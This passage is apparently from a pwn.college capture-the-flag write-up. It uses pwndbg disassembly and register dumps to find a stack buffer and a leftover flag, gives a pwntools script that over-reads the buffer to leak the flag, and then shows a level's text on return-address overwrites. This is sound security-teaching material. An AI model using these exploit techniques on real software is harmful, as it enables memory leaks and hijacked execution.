   0x0000000000001f4d <+81>:    mov    rdx,QWORD PTR [rbp-0x8]
   0x0000000000001f51 <+85>:    xor    rdx,QWORD PTR fs:0x28
   0x0000000000001f5a <+94>:    je     0x1f61 <verify_flag+101>
   0x0000000000001f5c <+96>:    call   0x1150 <__stack_chk_fail@plt>
   0x0000000000001f61 <+101>:   leave
   0x0000000000001f62 <+102>:   ret
End of assembler dump.
```

Let's set a breakpoint at `verify_flag+75`.

```
pwndbg> break *(verify_flag+75)
Breakpoint 1 at 0x1f47
```

#### `challenge()`

```
pwndbg> disassemble challenge 
Dump of assembler code for function challenge:
   0x0000000000001f63 <+0>:     endbr64
   0x0000000000001f67 <+4>:     push   rbp
   0x0000000000001f68 <+5>:     mov    rbp,rsp
   0x0000000000001f6b <+8>:     sub    rsp,0x1e0
   0x0000000000001f72 <+15>:    mov    DWORD PTR [rbp-0x1c4],edi
   0x0000000000001f78 <+21>:    mov    QWORD PTR [rbp-0x1d0],rsi
   0x0000000000001f7f <+28>:    mov    QWORD PTR [rbp-0x1d8],rdx
   0x0000000000001f86 <+35>:    mov    rax,QWORD PTR fs:0x28
   0x0000000000001f8f <+44>:    mov    QWORD PTR [rbp-0x8],rax
   0x0000000000001f93 <+48>:    xor    eax,eax
   0x0000000000001f95 <+50>:    lea    rax,[rbp-0x1a0]
   0x0000000000001f9c <+57>:    mov    QWORD PTR [rbp-0x1a8],rax
   0x0000000000001fa3 <+64>:    mov    QWORD PTR [rbp-0x1b0],0x0
   0x0000000000001fae <+75>:    lea    rdi,[rip+0x1157]        # 0x310c
   0x0000000000001fb5 <+82>:    mov    eax,0x0
   0x0000000000001fba <+87>:    call   0x1160 <printf@plt>
   0x0000000000001fbf <+92>:    lea    rax,[rbp-0x1b0]
   0x0000000000001fc6 <+99>:    mov    rsi,rax
   0x0000000000001fc9 <+102>:   lea    rdi,[rip+0x114b]        # 0x311b
   0x0000000000001fd0 <+109>:   mov    eax,0x0
   0x0000000000001fd5 <+114>:   call   0x11b0 <__isoc99_scanf@plt>
   0x0000000000001fda <+119>:   mov    rax,QWORD PTR [rbp-0x1b0]
   0x0000000000001fe1 <+126>:   mov    rsi,rax
   0x0000000000001fe4 <+129>:   lea    rdi,[rip+0x1135]        # 0x3120
   0x0000000000001feb <+136>:   mov    eax,0x0
   0x0000000000001ff0 <+141>:   call   0x1160 <printf@plt>
   0x0000000000001ff5 <+146>:   mov    rdx,QWORD PTR [rbp-0x1b0]
   0x0000000000001ffc <+153>:   mov    rax,QWORD PTR [rbp-0x1a8]
   0x0000000000002003 <+160>:   mov    rsi,rax
   0x0000000000002006 <+163>:   mov    edi,0x0
   0x000000000000200b <+168>:   call   0x1180 <read@plt>
   0x0000000000002010 <+173>:   mov    DWORD PTR [rbp-0x1b4],eax
   0x0000000000002016 <+179>:   cmp    DWORD PTR [rbp-0x1b4],0x0
   0x000000000000201d <+186>:   jns    0x204b <challenge+232>
   0x000000000000201f <+188>:   call   0x1120 <__errno_location@plt>
   0x0000000000002024 <+193>:   mov    eax,DWORD PTR [rax]
   0x0000000000002026 <+195>:   mov    edi,eax
   0x0000000000002028 <+197>:   call   0x11d0 <strerror@plt>
   0x000000000000202d <+202>:   mov    rsi,rax
   0x0000000000002030 <+205>:   lea    rdi,[rip+0x1111]        # 0x3148
   0x0000000000002037 <+212>:   mov    eax,0x0
   0x000000000000203c <+217>:   call   0x1160 <printf@plt>
   0x0000000000002041 <+222>:   mov    edi,0x1
   0x0000000000002046 <+227>:   call   0x11c0 <exit@plt>
   0x000000000000204b <+232>:   mov    rax,QWORD PTR [rbp-0x1a8]
   0x0000000000002052 <+239>:   mov    rsi,rax
   0x0000000000002055 <+242>:   lea    rdi,[rip+0x1110]        # 0x316c
   0x000000000000205c <+249>:   mov    eax,0x0
   0x0000000000002061 <+254>:   call   0x1160 <printf@plt>
   0x0000000000002066 <+259>:   lea    rdi,[rip+0x1111]        # 0x317e
   0x000000000000206d <+266>:   call   0x1130 <puts@plt>
   0x0000000000002072 <+271>:   mov    eax,0x0
   0x0000000000002077 <+276>:   mov    rcx,QWORD PTR [rbp-0x8]
   0x000000000000207b <+280>:   xor    rcx,QWORD PTR fs:0x28
   0x0000000000002084 <+289>:   je     0x208b <challenge+296>
   0x0000000000002086 <+291>:   call   0x1150 <__stack_chk_fail@plt>
   0x000000000000208b <+296>:   leave
   0x000000000000208c <+297>:   ret
End of assembler dump.
```

Another breakpoint at `challenge+168` where the call to `read@plt` is made.

```
pwndbg> break *(challenge+168)
Breakpoint 2 at 0x200b
```

Now, we can run the program and get the values.

```
pwndbg> run
Starting program: /challenge/lingering-leftover-hard 
###
### Welcome to /challenge/lingering-leftover-hard!
###


Breakpoint 1, 0x00005721cd032f47 in verify_flag ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────────────────────────────────────────────────────────────────────────
 RAX  0x7fff21143e7a ◂— 0x3d3e622feef
 RBX  0x5721cd0331a0 (__libc_csu_init) ◂— endbr64 
 RCX  0xffffffff
 RDX  0x100
 RDI  0xffffffff
 RSI  0x7fff21143e7a ◂— 0x3d3e622feef
 R8   0xa
 R9   0x33
 R10  0
 R11  0x246
 R12  0x5721cd0321e0 (_start) ◂— endbr64 
 R13  0x7fff211450c0 ◂— 1
 R14  0
 R15  0
 RBP  0x7fff21143f90 —▸ 0x7fff21144fd0 ◂— 0
 RSP  0x7fff21143e20 ◂— 0
 RIP  0x5721cd032f47 (verify_flag+75) ◂— call read@plt
────────────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0x5721cd032f47 <verify_flag+75>     call   read@plt                    <read@plt>
        fd: 0xffffffff
        buf: 0x7fff21143e7a ◂— 0x3d3e622feef
        nbytes: 0x100
 
   0x5721cd032f4c <verify_flag+80>     nop    
   0x5721cd032f4d <verify_flag+81>     mov    rdx, qword ptr [rbp - 8]
   0x5721cd032f51 <verify_flag+85>     xor    rdx, qword ptr fs:[0x28]
   0x5721cd032f5a <verify_flag+94>     je     verify_flag+101             <verify_flag+101>
 
   0x5721cd032f5c <verify_flag+96>     call   __stack_chk_fail@plt        <__stack_chk_fail@plt>
 
   0x5721cd032f61 <verify_flag+101>    leave  
   0x5721cd032f62 <verify_flag+102>    ret    
 
   0x5721cd032f63 <challenge>          endbr64 
   0x5721cd032f67 <challenge+4>        push   rbp
   0x5721cd032f68 <challenge+5>        mov    rbp, rsp
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7fff21143e20 ◂— 0
... ↓        7 skipped
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0   0x5721cd032f47 verify_flag+75
   1   0x5721cd03314e main+193
   2   0x73ddde212083 __libc_start_main+243
   3   0x5721cd03220e _start+46
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

- [ ] Location of buffer
- [x] Location of the flag in the stack: `0x7fff21143e7a`

```
pwndbg> c
Continuing.
Payload size: 2
Send your payload (up to 2 bytes)!

Breakpoint 2, 0x00005721cd03300b in challenge ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────────────────────────────────────────────────────────────────────────
*RAX  0x7fff21143df0 ◂— 0
 RBX  0x5721cd0331a0 (__libc_csu_init) ◂— endbr64 
*RCX  0
*RDX  2
*RDI  0
*RSI  0x7fff21143df0 ◂— 0
*R8   0x23
*R9   0x23
*R10  0x5721cd03413c ◂— ' bytes)!\n'
 R11  0x246
 R12  0x5721cd0321e0 (_start) ◂— endbr64 
 R13  0x7fff211450c0 ◂— 1
 R14  0
 R15  0
 RBP  0x7fff21143f90 —▸ 0x7fff21144fd0 ◂— 0
*RSP  0x7fff21143db0 ◂— 0
*RIP  0x5721cd03300b (challenge+168) ◂— call read@plt
────────────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0x5721cd03300b <challenge+168>    call   read@plt                    <read@plt>
        fd: 0 (/dev/pts/0)
        buf: 0x7fff21143df0 ◂— 0
        nbytes: 2
 
   0x5721cd033010 <challenge+173>    mov    dword ptr [rbp - 0x1b4], eax
   0x5721cd033016 <challenge+179>    cmp    dword ptr [rbp - 0x1b4], 0
   0x5721cd03301d <challenge+186>    jns    challenge+232               <challenge+232>
 
   0x5721cd03301f <challenge+188>    call   __errno_location@plt        <__errno_location@plt>
 
   0x5721cd033024 <challenge+193>    mov    eax, dword ptr [rax]
   0x5721cd033026 <challenge+195>    mov    edi, eax
   0x5721cd033028 <challenge+197>    call   strerror@plt                <strerror@plt>
 
   0x5721cd03302d <challenge+202>    mov    rsi, rax
   0x5721cd033030 <challenge+205>    lea    rdi, [rip + 0x1111]     RDI => 0x5721cd034148 ◂— 'ERROR: Failed to read input -- %s!\n'
   0x5721cd033037 <challenge+212>    mov    eax, 0                  EAX => 0
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7fff21143db0 ◂— 0
01:0008│-1d8 0x7fff21143db8 —▸ 0x7fff211450d8 —▸ 0x7fff2114568e ◂— 'SHELL=/run/dojo/bin/bash'
02:0010│-1d0 0x7fff21143dc0 —▸ 0x7fff211450c8 —▸ 0x7fff2114566b ◂— '/challenge/lingering-leftover-hard'
03:0018│-1c8 0x7fff21143dc8 ◂— 0x1feef1d00
04:0020│-1c0 0x7fff21143dd0 ◂— 0
05:0028│-1b8 0x7fff21143dd8 ◂— 0
06:0030│-1b0 0x7fff21143de0 ◂— 2
07:0038│-1a8 0x7fff21143de8 —▸ 0x7fff21143df0 ◂— 0
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0   0x5721cd03300b challenge+168
   1   0x5721cd03316c main+223
   2   0x73ddde212083 __libc_start_main+243
   3   0x5721cd03220e _start+46
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

- [x] Location of buffer: `0x7fff21143df0`
- [x] Location of the flag in the stack: `0x7fff21143e7a`

We can now perform a buffer over-read.

### Exploit 

```py title="~/script.py" showLineNumbers
from pwn import *

p = process('/challenge/lingering-leftover-hard')

# Initialize values
buffer_addr = 0x7fff21143df0
flag_addr = 0x7fff21143e7a

# Calculate offset & payload_size
offset = flag_addr - buffer_addr
payload_size = offset

# Build payload
payload = b"A" * offset

# Send payload size
p.recvuntil(b'Payload size: ')
p.sendline(str(payload_size).encode())

# Send payload
p.recvuntil(b'bytes)!')
p.send(payload)

p.interactive() 
```

```
hacker@program-security~lingering-leftover-hard:/$ python ~/script.py 
[+] Starting local process '/challenge/lingering-leftover-hard': pid 6644
[*] Switching to interactive mode

[*] Process '/challenge/lingering-leftover-hard' stopped with exit code 0 (pid 6644)
You said: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApwn.college{g3Gr3RrOLzEbVs6eMjPKXRf_tp8.0FNxMDL4ITM0EzW}
\xa8\xfd\x7f
Goodbye!
### Goodbye!
[*] Got EOF while reading in interactive
$ 
```

&nbsp;

## Latent Leak (Easy)

```
hacker@program-security~latent-leak-easy:/$ /challenge/latent-leak-easy 
###
### Welcome to /challenge/latent-leak-easy!
###

The challenge() function has just been launched!
However... An important initialization step was missed.
Use this to your advantage!

Before we do anything, let's take a look at challenge()'s stack frame:
+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007ffca8e19500 (rsp+0x0000) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffca8e19508 (rsp+0x0008) | 88 a8 e1 a8 fc 7f 00 00 | 0x00007ffca8e1a888 |
| 0x00007ffca8e19510 (rsp+0x0010) | 78 a8 e1 a8 fc 7f 00 00 | 0x00007ffca8e1a878 |
| 0x00007ffca8e19518 (rsp+0x0018) | 00 00 00 00 01 00 00 00 | 0x0000000100000000 |
| 0x00007ffca8e19520 (rsp+0x0020) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffca8e19528 (rsp+0x0028) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffca8e19530 (rsp+0x0030) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffca8e19538 (rsp+0x0038) | 40 95 e1 a8 fc 7f 00 00 | 0x00007ffca8e19540 |
| 0x00007ffca8e19540 (rsp+0x0040) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffca8e19548 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffca8e19550 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffca8e19558 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffca8e19560 (rsp+0x0060) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffca8e19568 (rsp+0x0068) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffca8e19570 (rsp+0x0070) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffca8e19578 (rsp+0x0078) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffca8e19580 (rsp+0x0080) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffca8e19588 (rsp+0x0088) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffca8e19590 (rsp+0x0090) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffca8e19598 (rsp+0x0098) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffca8e195a0 (rsp+0x00a0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffca8e195a8 (rsp+0x00a8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffca8e195b0 (rsp+0x00b0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffca8e195b8 (rsp+0x00b8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffca8e195c0 (rsp+0x00c0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffca8e195c8 (rsp+0x00c8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffca8e195d0 (rsp+0x00d0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffca8e195d8 (rsp+0x00d8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffca8e195e0 (rsp+0x00e0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffca8e195e8 (rsp+0x00e8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffca8e195f0 (rsp+0x00f0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffca8e195f8 (rsp+0x00f8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffca8e19600 (rsp+0x0100) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffca8e19608 (rsp+0x0108) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffca8e19610 (rsp+0x0110) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffca8e19618 (rsp+0x0118) | 93 11 3d b6 eb 7b 00 00 | 0x00007bebb63d1193 |
| 0x00007ffca8e19620 (rsp+0x0120) | ff fd ff 6f 00 00 00 00 | 0x000000006ffffdff |
| 0x00007ffca8e19628 (rsp+0x0128) | 00 a3 23 87 ea 62 c0 b5 | 0xb5c062ea8723a300 |
| 0x00007ffca8e19630 (rsp+0x0130) | 00 40 3b b6 eb 7b 00 00 | 0x00007bebb63b4000 |
| 0x00007ffca8e19638 (rsp+0x0138) | 60 58 c3 0b 92 59 00 00 | 0x000059920bc35860 |
| 0x00007ffca8e19640 (rsp+0x0140) | 00 42 c3 0b 92 59 00 00 | 0x000059920bc34200 |
| 0x00007ffca8e19648 (rsp+0x0148) | 70 a8 e1 a8 fc 7f 00 00 | 0x00007ffca8e1a870 |
| 0x00007ffca8e19650 (rsp+0x0150) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffca8e19658 (rsp+0x0158) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffca8e19660 (rsp+0x0160) | 80 a7 e1 a8 fc 7f 00 00 | 0x00007ffca8e1a780 |
| 0x00007ffca8e19668 (rsp+0x0168) | 3f 3d 22 b6 eb 7b 00 00 | 0x00007bebb6223d3f |
| 0x00007ffca8e19670 (rsp+0x0170) | 10 00 00 00 30 00 00 00 | 0x0000003000000010 |
| 0x00007ffca8e19678 (rsp+0x0178) | 50 97 e1 a8 fc 7f 00 00 | 0x00007ffca8e19750 |
| 0x00007ffca8e19680 (rsp+0x0180) | 90 96 e1 a8 fc 7f 00 00 | 0x00007ffca8e19690 |
| 0x00007ffca8e19688 (rsp+0x0188) | 8d 0e 25 b6 eb 7b 00 00 | 0x00007bebb6250e8d |
| 0x00007ffca8e19690 (rsp+0x0190) | a0 e6 1b 00 00 00 00 00 | 0x00000000001be6a0 |
| 0x00007ffca8e19698 (rsp+0x0198) | a0 f6 3a b6 eb 7b 00 00 | 0x00007bebb63af6a0 |
| 0x00007ffca8e196a0 (rsp+0x01a0) | 01 00 00 00 00 00 00 00 | 0x0000000000000001 |
| 0x00007ffca8e196a8 (rsp+0x01a8) | 23 f7 3a b6 eb 7b 00 00 | 0x00007bebb63af723 |
| 0x00007ffca8e196b0 (rsp+0x01b0) | 68 0d 00 00 00 00 00 00 | 0x0000000000000d68 |
| 0x00007ffca8e196b8 (rsp+0x01b8) | 51 29 25 b6 eb 7b 00 00 | 0x00007bebb6252951 |
| 0x00007ffca8e196c0 (rsp+0x01c0) | 68 0d 00 00 00 00 00 00 | 0x0000000000000d68 |
| 0x00007ffca8e196c8 (rsp+0x01c8) | 0a 00 00 00 00 00 00 00 | 0x000000000000000a |
| 0x00007ffca8e196d0 (rsp+0x01d0) | a0 f6 3a b6 eb 7b 00 00 | 0x00007bebb63af6a0 |
| 0x00007ffca8e196d8 (rsp+0x01d8) | 20 90 c3 0b 92 59 00 00 | 0x000059920bc39020 |
| 0x00007ffca8e196e0 (rsp+0x01e0) | 40 55 3b b6 eb 7b 00 00 | 0x00007bebb63b5540 |
| 0x00007ffca8e196e8 (rsp+0x01e8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffca8e196f0 (rsp+0x01f0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffca8e196f8 (rsp+0x01f8) | 93 2e 25 b6 eb 7b 00 00 | 0x00007bebb6252e93 |
| 0x00007ffca8e19700 (rsp+0x0200) | a0 f6 3a b6 eb 7b 00 00 | 0x00007bebb63af6a0 |
| 0x00007ffca8e19708 (rsp+0x0208) | 0a 00 00 00 00 00 00 00 | 0x000000000000000a |
| 0x00007ffca8e19710 (rsp+0x0210) | 20 90 c3 0b 92 59 00 00 | 0x000059920bc39020 |
| 0x00007ffca8e19718 (rsp+0x0218) | 02 83 24 b6 eb 7b 00 00 | 0x00007bebb6248302 |
| 0x00007ffca8e19720 (rsp+0x0220) | 60 58 c3 0b 92 59 00 00 | 0x000059920bc35860 |
| 0x00007ffca8e19728 (rsp+0x0228) | 60 58 c3 0b 92 59 00 00 | 0x000059920bc35860 |
| 0x00007ffca8e19730 (rsp+0x0230) | 80 a7 e1 a8 fc 7f 00 00 | 0x00007ffca8e1a780 |
| 0x00007ffca8e19738 (rsp+0x0238) | 00 a3 23 87 ea 62 c0 b5 | 0xb5c062ea8723a300 |
| 0x00007ffca8e19740 (rsp+0x0240) | 80 a7 e1 a8 fc 7f 00 00 | 0x00007ffca8e1a780 |
| 0x00007ffca8e19748 (rsp+0x0248) | 30 58 c3 0b 92 59 00 00 | 0x000059920bc35830 |
+---------------------------------+-------------------------+--------------------+
Our stack pointer points to 0x7ffca8e19500, and our base pointer points to 0x7ffca8e19740.
This means that we have (decimal) 74 8-byte words in our stack frame,
including the saved base pointer and the saved return address, for a
total of 592 bytes.
The input buffer begins at 0x7ffca8e19540, partway through the stack frame,
("above" it in the stack are other local variables used by the function).
Your input will be read into this buffer.
The buffer is 493 bytes long, but the program will let you provide an arbitrarily
large input length, and thus overflow the buffer.

In this level, there is no "win" variable.
You will need to force the program to execute the win_authed() function
by directly overflowing into the stored return address back to main,
which is stored at 0x7ffca8e19748, 520 bytes after the start of your input buffer.
That means that you will need to input at least 528 bytes (493 to fill the buffer,
27 to fill other stuff stored between the buffer and the return address,
and 8 that will overwrite the return address).

Because the binary is position independent, you cannot know
exactly where the win_authed() function is located.
This means that it is not clear what should be written into the return address.

Payload size: 2
You have chosen to send 2 bytes of input!
This will allow you to write from 0x7ffca8e19540 (the start of the input buffer)
right up to (but not including) 0x7ffca8e19542 (which is -491 bytes beyond the end of the buffer).
Of these, you will overwrite -518 bytes into the return address.
If that number is greater than 8, you will overwrite the entire return address.

Overwriting the entire return address is fine when we know
the whole address, but here, we only really know the last three nibbles.
These nibbles never change, because pages are aligned to 0x1000.
This gives us a workaround: we can overwrite the least significant byte
of the saved return address, which we can know from debugging the binary,
to retarget the return to main to any instruction that shares the other 7 bytes.
Since that last byte will be constant between executions (due to page alignment),
this will always work.
If the address we want to redirect execution to is a bit farther away from
the saved return address, and we need to write two bytes, then one of those
nibbles (the fourth least-significant one) will be a guess, and it will be
incorrect 15 of 16 times.
This is okay: we can just run our exploit a few times until it works
(statistically, ~50% chance after 11 times and ~90% chance after 36 times).
One caveat in this challenge is that the win_authed() function must first auth:
it only lets you win if you provide it with the argument 0x1337.
Speifically, the win_authed() function looks something like:
    void win_authed(int token)
    {
      if (token != 0x1337) return;
      puts("You win! Here is your flag: ");
      sendfile(1, open("/flag", 0), 0, 256);
      puts("");
    }

So how do you pass the check? There *is* a way, and we will cover it later,
but for now, we will simply bypass it! You can overwrite the return address
with *any* value (as long as it points to executable code), not just the start
of functions. Let's overwrite past the token check in win!

To do this, we will need to analyze the program with objdump, identify where
the check is in the win_authed() function, find the address right after the check,
and write that address over the saved return address.

Go ahead and find this address now. When you're ready, input a buffer overflow
that will overwrite the saved return address (at 0x7ffca8e19748, 520 bytes into the buffer)
with the correct value.

Send your payload (up to 2 bytes)!
aa
You sent 2 bytes!
Let's see what happened with the stack:

+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007ffca8e19500 (rsp+0x0000) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffca8e19508 (rsp+0x0008) | 88 a8 e1 a8 fc 7f 00 00 | 0x00007ffca8e1a888 |
| 0x00007ffca8e19510 (rsp+0x0010) | 78 a8 e1 a8 fc 7f 00 00 | 0x00007ffca8e1a878 |
| 0x00007ffca8e19518 (rsp+0x0018) | 00 00 00 00 01 00 00 00 | 0x0000000100000000 |
| 0x00007ffca8e19520 (rsp+0x0020) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffca8e19528 (rsp+0x0028) | 00 00 00 00 02 00 00 00 | 0x0000000200000000 |
| 0x00007ffca8e19530 (rsp+0x0030) | 02 00 00 00 00 00 00 00 | 0x0000000000000002 |
| 0x00007ffca8e19538 (rsp+0x0038) | 40 95 e1 a8 fc 7f 00 00 | 0x00007ffca8e19540 |
| 0x00007ffca8e19540 (rsp+0x0040) | 61 61 00 00 00 00 00 00 | 0x0000000000006161 |
| 0x00007ffca8e19548 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffca8e19550 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffca8e19558 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffca8e19560 (rsp+0x0060) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffca8e19568 (rsp+0x0068) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffca8e19570 (rsp+0x0070) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffca8e19578 (rsp+0x0078) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffca8e19580 (rsp+0x0080) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffca8e19588 (rsp+0x0088) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffca8e19590 (rsp+0x0090) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffca8e19598 (rsp+0x0098) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffca8e195a0 (rsp+0x00a0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffca8e195a8 (rsp+0x00a8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffca8e195b0 (rsp+0x00b0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffca8e195b8 (rsp+0x00b8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffca8e195c0 (rsp+0x00c0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffca8e195c8 (rsp+0x00c8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffca8e195d0 (rsp+0x00d0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffca8e195d8 (rsp+0x00d8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffca8e195e0 (rsp+0x00e0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffca8e195e8 (rsp+0x00e8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffca8e195f0 (rsp+0x00f0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffca8e195f8 (rsp+0x00f8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffca8e19600 (rsp+0x0100) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffca8e19608 (rsp+0x0108) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffca8e19610 (rsp+0x0110) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffca8e19618 (rsp+0x0118) | 93 11 3d b6 eb 7b 00 00 | 0x00007bebb63d1193 |
| 0x00007ffca8e19620 (rsp+0x0120) | ff fd ff 6f 00 00 00 00 | 0x000000006ffffdff |
| 0x00007ffca8e19628 (rsp+0x0128) | 00 a3 23 87 ea 62 c0 b5 | 0xb5c062ea8723a300 |
| 0x00007ffca8e19630 (rsp+0x0130) | 00 40 3b b6 eb 7b 00 00 | 0x00007bebb63b4000 |
| 0x00007ffca8e19638 (rsp+0x0138) | 60 58 c3 0b 92 59 00 00 | 0x000059920bc35860 |
| 0x00007ffca8e19640 (rsp+0x0140) | 00 42 c3 0b 92 59 00 00 | 0x000059920bc34200 |
| 0x00007ffca8e19648 (rsp+0x0148) | 70 a8 e1 a8 fc 7f 00 00 | 0x00007ffca8e1a870 |
| 0x00007ffca8e19650 (rsp+0x0150) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffca8e19658 (rsp+0x0158) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffca8e19660 (rsp+0x0160) | 80 a7 e1 a8 fc 7f 00 00 | 0x00007ffca8e1a780 |
| 0x00007ffca8e19668 (rsp+0x0168) | 3f 3d 22 b6 eb 7b 00 00 | 0x00007bebb6223d3f |
| 0x00007ffca8e19670 (rsp+0x0170) | 10 00 00 00 30 00 00 00 | 0x0000003000000010 |
| 0x00007ffca8e19678 (rsp+0x0178) | 50 97 e1 a8 fc 7f 00 00 | 0x00007ffca8e19750 |
| 0x00007ffca8e19680 (rsp+0x0180) | 90 96 e1 a8 fc 7f 00 00 | 0x00007ffca8e19690 |
| 0x00007ffca8e19688 (rsp+0x0188) | 8d 0e 25 b6 eb 7b 00 00 | 0x00007bebb6250e8d |
| 0x00007ffca8e19690 (rsp+0x0190) | a0 e6 1b 00 00 00 00 00 | 0x00000000001be6a0 |
| 0x00007ffca8e19698 (rsp+0x0198) | a0 f6 3a b6 eb 7b 00 00 | 0x00007bebb63af6a0 |
| 0x00007ffca8e196a0 (rsp+0x01a0) | 01 00 00 00 00 00 00 00 | 0x0000000000000001 |
| 0x00007ffca8e196a8 (rsp+0x01a8) | 23 f7 3a b6 eb 7b 00 00 | 0x00007bebb63af723 |
